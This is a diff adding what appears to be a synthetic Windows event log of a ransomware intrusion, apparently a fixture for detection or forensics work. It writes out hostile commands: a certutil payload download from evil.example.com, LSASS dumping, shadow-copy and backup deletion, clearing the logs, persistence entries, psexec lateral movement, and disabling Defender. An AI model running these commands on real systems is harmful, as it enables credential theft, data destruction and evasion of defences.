@@ -1,0 +1,26 @@
+2025-03-15 03:00:01, Info CBS TrustedInstaller service starts successfully.
+2025-03-15 03:01:15, Warning SYSTEM Process powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==
+2025-03-15 03:01:20, Error SECURITY Suspicious process: powershell.exe executed with -encodedcommand parameter by user CORP\jsmith
+2025-03-15 03:01:30, Warning SYSTEM Process certutil.exe -urlcache -split -f http://evil.example.com/payload.exe C:\Windows\Temp\svchost.exe
+2025-03-15 03:01:45, Error SECURITY LSASS memory access by C:\Windows\Temp\svchost.exe (PID 4856) - possible credential dumping via mimikatz
+2025-03-15 03:02:00, Error SECURITY Process procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp executed by CORP\jsmith
+2025-03-15 03:02:30, Warning SYSTEM vssadmin.exe delete shadows /all /quiet executed by CORP\jsmith
+2025-03-15 03:02:35, Warning SYSTEM bcdedit.exe /set {default} recoveryenabled no executed by CORP\jsmith
+2025-03-15 03:02:40, Warning SYSTEM wbadmin.exe delete catalog -quiet executed by CORP\jsmith
+2025-03-15 03:03:00, Error SYSTEM File C:\Users\jsmith\Documents\report.docx renamed to C:\Users\jsmith\Documents\report.docx.locked
+2025-03-15 03:03:01, Error SYSTEM File C:\Users\jsmith\Documents\budget.xlsx renamed to C:\Users\jsmith\Documents\budget.xlsx.locked
+2025-03-15 03:03:02, Error SYSTEM File C:\Users\jsmith\Documents\project.pdf renamed to C:\Users\jsmith\Documents\project.pdf.locked
+2025-03-15 03:03:03, Error SYSTEM File C:\Users\jsmith\Desktop\credentials.txt renamed to C:\Users\jsmith\Desktop\credentials.txt.locked
+2025-03-15 03:03:04, Error SYSTEM File C:\Users\jsmith\Desktop\how_to_decrypt.txt created by C:\Windows\Temp\svchost.exe
+2025-03-15 03:03:10, Critical SECURITY Ransom note dropped: how_to_decrypt.txt - Your files have been encrypted. Pay 5 BTC to wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+2025-03-15 03:03:20, Error SYSTEM wevtutil.exe cl Security executed by CORP\jsmith
+2025-03-15 03:03:21, Error SYSTEM wevtutil.exe cl System executed by CORP\jsmith
+2025-03-15 03:03:22, Critical SECURITY The audit log was cleared. Subject: CORP\jsmith
+2025-03-15 03:04:00, Warning SYSTEM sc create EvilSvc binpath= "C:\Windows\Temp\svchost.exe -service" start= auto
+2025-03-15 03:04:10, Warning SYSTEM schtasks /create /sc minute /mo 5 /tn "WindowsUpdate" /tr "C:\Windows\Temp\svchost.exe"
+2025-03-15 03:04:30, Warning SYSTEM reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\svchost.exe" /f
+2025-03-15 03:05:00, Error SECURITY Lateral movement: psexec.exe \\10.0.0.20 -u CORP\admin -p P@ssw0rd cmd.exe
+2025-03-15 03:05:30, Warning NETWORK Outbound connection to 185.220.101.45:443 by C:\Windows\Temp\svchost.exe (C2 beacon)
+2025-03-15 03:05:31, Warning NETWORK Outbound connection to 185.220.101.45:443 by C:\Windows\Temp\svchost.exe (C2 beacon)
+2025-03-15 03:06:00, Warning SYSTEM Set-MpPreference -DisableRealtimeMonitoring $true executed by CORP\jsmith
+2025-03-15 03:06:10, Warning SYSTEM Add-MpPreference -ExclusionPath "C:\Windows\Temp" executed by CORP\jsmith
